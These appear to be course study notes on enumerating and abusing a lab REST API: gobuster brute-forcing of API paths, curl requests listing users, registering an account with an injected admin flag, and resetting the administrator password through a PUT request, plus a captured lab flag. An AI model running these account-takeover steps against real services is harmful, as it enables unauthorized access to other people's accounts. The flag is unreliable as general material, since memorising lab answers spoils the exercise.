# Enumerating and Abusing APIs

API Path Naming Convention
>``` shell
>/api_name/v1
>```

Gobuster pattern
>``` shell
>{GOBUSTER}/v1
>{GOBUSTER}/v2
>```

Bruteforcing API Paths
>``` shell
>kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
>
># ========== Expected Result ==========
>===============================================================
>Gobuster v3.1.0
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
>===============================================================
>[+] Url:                     http://192.168.50.16:5001
>[+] Method:                  GET
>[+] Threads:                 10
>[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
>[+] Patterns:                pattern (1 entries)
>[+] Negative Status codes:   404
>[+] User Agent:              gobuster/3.1.0
>[+] Timeout:                 10s
>===============================================================
>2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
>===============================================================
>/books/v1             (Status: 200) [Size: 235]
>/console              (Status: 200) [Size: 1985]
>/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
>/users/v1             (Status: 200) [Size: 241]
># =====================================
>```

Obtaining Users' Information
>``` shell
>kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
>
># ========== Expected Result ==========
>HTTP/1.0 200 OK
>Content-Type: application/json
>Content-Length: 241
>Server: Werkzeug/1.0.1 Python/3.7.13
>Date: Wed, 06 Apr 2022 09:27:50 GMT
>
>{
>  "users": [
>    {
>      "email": "mail1@mail.com",
>      "username": "name1"
>    },
>    {
>      "email": "mail2@mail.com",
>      "username": "name2"
>    },
>    {
>      "email": "admin@mail.com",
>      "username": "admin"
>    }
>  ]
>}
># =====================================
>```

Discovering extra APIs
>``` shell
>kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
>
># ========== Expected Result ==========
>===============================================================
>Gobuster v3.1.0
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
>===============================================================
>[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
>[+] Method:                  GET
>[+] Threads:                 10
>[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
>[+] Negative Status codes:   404
>[+] User Agent:              gobuster/3.1.0
>[+] Timeout:                 10s
>===============================================================
>2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
>===============================================================
>/email                (Status: 405) [Size: 142]
>/password             (Status: 405) [Size: 142]
>
>===============================================================
>2022/04/06 06:40:35 Finished
>===============================================================
># =====================================
>```

Discovering API unsupported methods
>``` shell
>kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
>
># ========== Expected Result ==========
>HTTP/1.0 405 METHOD NOT ALLOWED
>Content-Type: application/problem+json
>Content-Length: 142
>Server: Werkzeug/1.0.1 Python/3.7.13
>Date: Wed, 06 Apr 2022 10:58:51 GMT
>
>{
>  "detail": "The method is not allowed for the requested URL.",
>  "status": 405,
>  "title": "Method Not Allowed",
>  "type": "about:blank"
>}
># =====================================
>```

Inspecting the 'login' API
>``` shell
>kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
>
># ========== Expected Result ==========
>HTTP/1.0 404 NOT FOUND
>Content-Type: application/json
>Content-Length: 48
>Server: Werkzeug/1.0.1 Python/3.7.13
>Date: Wed, 06 Apr 2022 12:04:30 GMT
>
>{ "status": "fail", "message": "User not found"}
># =====================================
>```

Crafting a POST request against the login API
>``` shell
>kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
>
># ========== Expected Result ==========
>{ "status": "fail", "message": "Password is not correct for the given username."}
># =====================================
>```

Attempting new User Registration
>``` shell
>kali@kali:~$ curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
>
># ========== Expected Result ==========
>{ "status": "fail", "message": "'email' is a required property"}
># =====================================
>```

Attempting to register a new user as admin
>``` shell
>kali@kali:~$ curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
>
># ========== Expected Result ==========
>{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
># =====================================
>```

Logging in as an admin user
>``` shell
>kali@kali:~$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
>
># ========== Expected Result ==========
>{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
># =====================================
>```

Attempting to Change the Administrator Password via a POST request
>``` shell
>kali@kali:~$ curl  \
>  'http://192.168.50.16:5002/users/v1/admin/password' \
>  -H 'Content-Type: application/json' \
>  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
>  -d '{"password": "pwned"}'
>
># ========== Expected Result ==========
>{
>  "detail": "The method is not allowed for the requested URL.",
>  "status": 405,
>  "title": "Method Not Allowed",
>  "type": "about:blank"
>}
># =====================================
>```

Attempting to Change the Administrator Password via a PUT request
>``` shell
>kali@kali:~$ curl -X 'PUT' \
>  'http://192.168.50.16:5002/users/v1/admin/password' \
>  -H 'Content-Type: application/json' \
>  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
>  -d '{"password": "pwned"}'
>```

Successfully logging in as the admin account
>``` shell
>kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
>
># ========== Expected Result ==========
>{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
># =====================================
>```

Lab 1 - 
>``` shell
># Map Hostname to IP
>kali@kali:~$ sudo nano /etc/hosts
>
># Add this line at the bottom:
>192.168.179.16 offsecwp
>
># Save and exit:
>Ctrl + X
>
># Navigate to http://offsecwp/?p=1
>
># Right-click anywhere on the page, click Inspect, and enter "OS{" in the search bar
>```
>OS{c220cc334635a533cae9c236c2e31aa0}

Lab 2 - 
>``` shell
>
>```
>

Lab 3 - 
>``` shell
>
>```
>

Lab 4 - 
>``` shell
>
>```
>

Lab 5 - 
>``` shell
>
>```
>

Lab 6 - 
>``` shell
>
>```
>
